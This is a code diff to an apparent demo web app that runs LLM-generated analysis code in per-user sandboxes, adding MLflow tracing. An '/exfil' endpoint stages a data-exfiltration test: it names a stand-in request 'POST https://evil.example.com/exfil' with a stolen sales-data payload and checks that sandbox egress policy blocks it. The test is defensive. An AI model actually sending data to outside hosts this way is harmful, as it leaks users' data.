@@ -4,14 +4,38 @@
 import json
 import logging
 import os
+import time
 from pathlib import Path
+from contextlib import asynccontextmanager
+from typing import Sequence
 
 from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 from openshell import SandboxClient, TlsConfig
 
-app = FastAPI()
+import mlflow
+
+MLFLOW_TRACKING_URI = os.environ.get("MLFLOW_TRACKING_URI", "")
+MLFLOW_EXPERIMENT = os.environ.get("MLFLOW_EXPERIMENT", "secure-agent-sandbox")
+
+
+@asynccontextmanager
+async def lifespan(app):
+    if MLFLOW_TRACKING_URI:
+        try:
+            token_file = os.environ.get("MLFLOW_TRACKING_TOKEN_FILE", "")
+            if token_file and Path(token_file).exists():
+                os.environ["MLFLOW_TRACKING_TOKEN"] = Path(token_file).read_text().strip()
+            os.environ["MLFLOW_WORKSPACE"] = os.environ.get("POD_NAMESPACE", "agent-sandbox-demo")
+            mlflow.set_tracking_uri(MLFLOW_TRACKING_URI)
+            mlflow.set_experiment(MLFLOW_EXPERIMENT)
+            log.info("MLflow tracing → %s (experiment: %s)", MLFLOW_TRACKING_URI, MLFLOW_EXPERIMENT)
+        except Exception as e:
+            log.warning("MLflow init failed (non-blocking): %s", e)
+    yield
+
+app = FastAPI(lifespan=lifespan)
 log = logging.getLogger("chat")
 logging.basicConfig(level=logging.INFO)
 
@@ -23,7 +47,7 @@ MAAS_MODEL = os.environ.get("MAAS_MODEL", "qwen35-9b")
 NETWORK_BLOCK_SIGNALS = ("Tunnel connection failed", "403 Forbidden", "not allowed by any policy")
 
 ANALYST_SCRIPT = r'''
-import csv, json, sys, urllib.request, os, io
+import csv, json, sys, urllib.request, os, io, time as _t
 from contextlib import redirect_stdout
 
 CSV_DATA = """date,region,product,units,revenue
@@ -65,11 +89,24 @@ api_key = os.environ.get("MAAS_API_KEY", "")
 if api_key:
     headers["Authorization"] = f"Bearer {api_key}"
 
+_t0 = _t.time()
 req = urllib.request.Request(os.environ["MAAS_URL"], data=payload, headers=headers, method="POST")
 resp = urllib.request.urlopen(req, timeout=30)
-raw_response = json.loads(resp.read())["choices"][0]["message"]["content"].strip()
+llm_body = json.loads(resp.read())
+_duration = int((_t.time() - _t0) * 1000)
+raw_response = llm_body["choices"][0]["message"]["content"].strip()
 code = raw_response.removeprefix("```python").removeprefix("```").removesuffix("```").strip()
 
+usage = llm_body.get("usage", {})
+print("__META__")
+print(json.dumps({
+    "model": llm_body.get("model", ""),
+    "prompt_tokens": usage.get("prompt_tokens", 0),
+    "completion_tokens": usage.get("completion_tokens", 0),
+    "total_tokens": usage.get("total_tokens", 0),
+    "llm_duration_ms": _duration,
+}))
+print("__END_META__")
 print("__CODE__")
 print(code)
 print("__END_CODE__")
@@ -95,7 +132,7 @@ except Exception as e:
 
 
 # ---------------------------------------------------------------------------
-# OpenShell client (singleton, long-lived gRPC channel)
+# OpenShell client
 # ---------------------------------------------------------------------------
 
 _client: SandboxClient | None = None
@@ -107,26 +144,21 @@ def _get_client() -> SandboxClient:
         return _client
     tls_dir = os.environ.get("OPENSHELL_TLS_DIR", "")
     if tls_dir:
-        tls = TlsConfig(
+        _client = SandboxClient(GATEWAY_ENDPOINT, tls=TlsConfig(
             ca_path=Path(tls_dir) / "ca.crt",
             cert_path=Path(tls_dir) / "tls.crt",
             key_path=Path(tls_dir) / "tls.key",
-        )
-        _client = SandboxClient(GATEWAY_ENDPOINT, tls=tls)
+        ))
     else:
         _client = SandboxClient(GATEWAY_ENDPOINT)
     return _client
 
 
 def _get_session(username: str):
-    """Find the user's sandbox by label and return a fresh session."""
     client = _get_client()
     sandboxes = client.list(workspace=WORKSPACE, label_selector=f"owner={username}")
     if not sandboxes:
-        raise RuntimeError(
-            f"No sandbox for user '{username}'. "
-            f"Create one with: openshell sandbox create --name analyst-{username} --label owner={username}"
-        )
+        raise RuntimeError(f"No sandbox for '{username}'. Create: openshell sandbox create --name analyst-{username} --label owner={username}")
     return client.get_session(sandboxes[0].name, workspace=WORKSPACE)
 
 
@@ -134,17 +166,23 @@ def _is_network_blocked(output: str) -> bool:
     return any(sig in output for sig in NETWORK_BLOCK_SIGNALS)
 
 
-def _parse_output(raw: str) -> tuple[str, str]:
+def _parse_output(raw: str) -> tuple[str, str, dict]:
     code = result = ""
+    meta = {}
+    if "__META__" in raw and "__END_META__" in raw:
+        try:
+            meta = json.loads(raw.split("__META__")[1].split("__END_META__")[0].strip())
+        except Exception:
+            pass
     if "__CODE__" in raw and "__END_CODE__" in raw:
         code = raw.split("__CODE__")[1].split("__END_CODE__")[0].strip()
     if "__RESULT__" in raw and "__END_RESULT__" in raw:
         result = raw.split("__RESULT__")[1].split("__END_RESULT__")[0].strip()
-    return code, result
+    return code, result, meta
 
 
 # ---------------------------------------------------------------------------
-# Request / response models
+# Models
 # ---------------------------------------------------------------------------
 
 class AskRequest(BaseModel):
@@ -162,6 +200,106 @@ class AskResponse(BaseModel):
 
 
 # ---------------------------------------------------------------------------
+# Generic traced sandbox execution
+# ---------------------------------------------------------------------------
+
+_sessions: dict[str, str] = {}
+
+
+def _session_id(username: str) -> str:
+    if username not in _sessions:
+        _sessions[username] = f"{username}-{int(time.time())}"
+    return _sessions[username]
+
+
+def _exec_in_sandbox(username: str, command: Sequence[str], env: dict | None = None, timeout: int = 60):
+    session = _get_session(username)
+    result = session.exec(command, env=env, timeout_seconds=timeout)
+    return session.sandbox.name, session.sandbox.id, result
+
+
+@mlflow.trace(name="sandbox_agent", span_type="AGENT")
+def traced_ask(question: str, username: str, model: str) -> tuple[str, str, int]:
+    sid = _session_id(username)
+    mlflow.update_current_trace(
+        session_id=sid, user=username,
+        request_preview=question[:500],
+        tags={"agent": "secure-analyst", "agent_version": "1.0", "model": model,
+              "sandbox_runtime": "openshell", "platform": "RHOAI 3.5"},
+    )
+
+    env = {"MAAS_URL": MAAS_URL, "MAAS_MODEL": model}
+    api_key = os.environ.get("MAAS_API_KEY", "")
+    if api_key:
+        env["MAAS_API_KEY"] = api_key
+
+    with mlflow.start_span(name="sandbox_lookup", span_type="RETRIEVER") as span:
+        span.set_inputs({"user": username, "workspace": WORKSPACE})
+        sandbox_name, sandbox_id, result = _exec_in_sandbox(
+            username, ["python3", "-c", ANALYST_SCRIPT, question], env=env)
+        span.set_outputs({"sandbox": sandbox_name, "id": sandbox_id})
+
+    stdout = result.stdout or ""
+    stderr = result.stderr or ""
+    code, answer, meta = _parse_output(stdout)
+
+    if _is_network_blocked(stdout + stderr):
+        with mlflow.start_span(name="proxy_verdict", span_type="TOOL") as span:
+            span.set_inputs({"endpoint": MAAS_URL})
+            span.set_outputs({"verdict": "DENIED", "reason": "no egress rule"})
+        mlflow.update_current_trace(response_preview="BLOCKED")
+        return stdout, stderr, result.exit_code
+
+    with mlflow.start_span(name="llm_inference", span_type="LLM") as span:
+        span.set_inputs({"question": question, "model": meta.get("model", model), "endpoint": MAAS_URL})
+        span.set_outputs({"generated_code": code[:500], "answer": answer[:500]})
+        span.set_attributes({
+            "llm.model": meta.get("model", model),
+            "llm.prompt_tokens": meta.get("prompt_tokens", 0),
+            "llm.completion_tokens": meta.get("completion_tokens", 0),
+            "llm.total_tokens": meta.get("total_tokens", 0),
+            "llm.duration_ms": meta.get("llm_duration_ms", 0),
+        })
+
+    with mlflow.start_span(name="code_execution", span_type="TOOL") as span:
+        span.set_inputs({"code": code[:500], "sandbox": sandbox_name})
+        span.set_outputs({"result": answer[:500], "exit_code": result.exit_code})
+
+    with mlflow.start_span(name="proxy_verdict", span_type="TOOL") as span:
+        span.set_inputs({"endpoint": MAAS_URL})
+        span.set_outputs({"verdict": "ALLOWED", "policy": "maas_inference"})
+
+    mlflow.update_current_trace(response_preview=answer[:500] if answer else "code error")
+    return stdout, stderr, result.exit_code
+
+
+@mlflow.trace(name="exfiltration_test", span_type="AGENT")
+def traced_exfil(username: str) -> tuple[str, str, int]:
+    sid = _session_id(username)
+    mlflow.update_current_trace(
+        session_id=sid, user=username,
+        request_preview="POST https://evil.example.com/exfil",
+        tags={"agent": "exfil-test", "action": "data_exfiltration", "sandbox_runtime": "openshell"},
+    )
+
+    with mlflow.start_span(name="sandbox_lookup", span_type="RETRIEVER") as span:
+        span.set_inputs({"user": username})
+        sandbox_name, sandbox_id, result = _exec_in_sandbox(
+            username, ["python3", "-c", EXFIL_SCRIPT], timeout=15)
+        span.set_outputs({"sandbox": sandbox_name, "id": sandbox_id})
+
+    raw = (result.stdout or "") + (result.stderr or "")
+    blocked = "__EXFIL_BLOCKED__" in raw or result.exit_code != 0
+
+    with mlflow.start_span(name="proxy_verdict", span_type="TOOL") as span:
+        span.set_inputs({"target": "evil.example.com:443", "payload": '{"stolen":"sales-data"}'})
+        span.set_outputs({"verdict": "DENIED" if blocked else "ALLOWED"})
+
+    mlflow.update_current_trace(response_preview="BLOCKED" if blocked else "EXFILTRATED")
+    return result.stdout or "", result.stderr or "", result.exit_code
+
+
+# ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
 
@@ -170,21 +308,13 @@ def _user(request: Request) -> str:
 
 
 def _blocked_response(question: str, username: str, sandbox: str, detail: str) -> AskResponse:
-    return AskResponse(
-        question=question, user=username, sandbox=sandbox,
-        code="", result=detail,
-        verdict="BLOCKED — sandbox network policy denied the request",
-        blocked=True,
-    )
+    return AskResponse(question=question, user=username, sandbox=sandbox,
+        code="", result=detail, verdict="BLOCKED — sandbox network policy denied the request", blocked=True)
 
 
 def _error_response(question: str, username: str, detail: str) -> AskResponse:
-    return AskResponse(
-        question=question, user=username, sandbox="",
-        code="", result=detail,
-        verdict=f"ERROR — {detail[:120]}",
-        blocked=False,
-    )
+    return AskResponse(question=question, user=username, sandbox="",
+        code="", result=detail, verdict=f"ERROR — {detail[:120]}", blocked=False)
 
 
 # ---------------------------------------------------------------------------
@@ -200,63 +330,38 @@ def whoami(request: Request):
 def ask(req: AskRequest, request: Request):
     username = _user(request)
     try:
-        session = _get_session(username)
+        stdout, stderr, exit_code = traced_ask(req.question, username, MAAS_MODEL)
     except Exception as e:
         return _error_response(req.question, username, str(e))
 
-    sandbox_name = session.sandbox.name
-    env = {"MAAS_URL": MAAS_URL, "MAAS_MODEL": MAAS_MODEL}
-    api_key = os.environ.get("MAAS_API_KEY", "")
-    if api_key:
-        env["MAAS_API_KEY"] = api_key
+    if _is_network_blocked(stdout + stderr):
+        return _blocked_response(req.question, username, "",
+            "MaaS access denied by sandbox policy.\n\nApply: openshell policy set <sandbox> --policy policies/analyst.yaml --wait")
 
-    result = session.exec(["python3", "-c", ANALYST_SCRIPT, req.question], env=env, timeout_seconds=60)
-    raw = (result.stdout or "") + (result.stderr or "")
+    code, answer, _ = _parse_output(stdout)
+    if not answer and exit_code != 0:
+        return AskResponse(question=req.question, user=username, sandbox="",
+            code=code, result=stderr or (stdout + stderr)[:500],
+            verdict="ALLOWED — MaaS reached, but the generated code failed", blocked=False)
 
-    if _is_network_blocked(raw):
-        return _blocked_response(
-            req.question, username, sandbox_name,
-            f"MaaS access denied by sandbox policy.\n\nApply: openshell policy set {sandbox_name} --policy policies/analyst.yaml --wait",
-        )
-
-    code, answer = _parse_output(result.stdout or "")
-
-    if not answer and result.exit_code != 0:
-        return AskResponse(
-            question=req.question, user=username, sandbox=sandbox_name,
-            code=code, result=result.stderr or raw[:500],
-            verdict="ALLOWED — MaaS reached, but the generated code failed",
-            blocked=False,
-        )
-
-    return AskResponse(
-        question=req.question, user=username, sandbox=sandbox_name,
-        code=code, result=answer,
-        verdict="ALLOWED — code executed inside sandbox",
-        blocked=False,
-    )
+    return AskResponse(question=req.question, user=username, sandbox="",
+        code=code, result=answer, verdict="ALLOWED — code executed inside sandbox", blocked=False)
 
 
 @app.post("/exfil")
 def exfil(request: Request):
     username = _user(request)
     try:
-        session = _get_session(username)
+        stdout, stderr, exit_code = traced_exfil(username)
     except Exception as e:
         return _error_response("Exfiltration attempt", username, str(e))
 
-    sandbox_name = session.sandbox.name
-    result = session.exec(["python3", "-c", EXFIL_SCRIPT], timeout_seconds=15)
-    raw = (result.stdout or "") + (result.stderr or "")
-    blocked = "__EXFIL_BLOCKED__" in raw or result.exit_code != 0
-
+    blocked = "__EXFIL_BLOCKED__" in (stdout + stderr) or exit_code != 0
     return AskResponse(
-        question="Exfiltration attempt",
-        user=username, sandbox=sandbox_name,
+        question="Exfiltration attempt", user=username, sandbox="",
         code='POST https://evil.example.com/exfil {"stolen":"sensitive-sales-data"}',
         result="Connection denied." if blocked else "Data exfiltrated!",
-        verdict="BLOCKED — outbound connection denied by sandbox policy" if blocked
-            else "WARNING — exfiltration succeeded!",
+        verdict="BLOCKED — outbound connection denied by sandbox policy" if blocked else "WARNING — exfiltration succeeded!",
         blocked=blocked,
     )
 
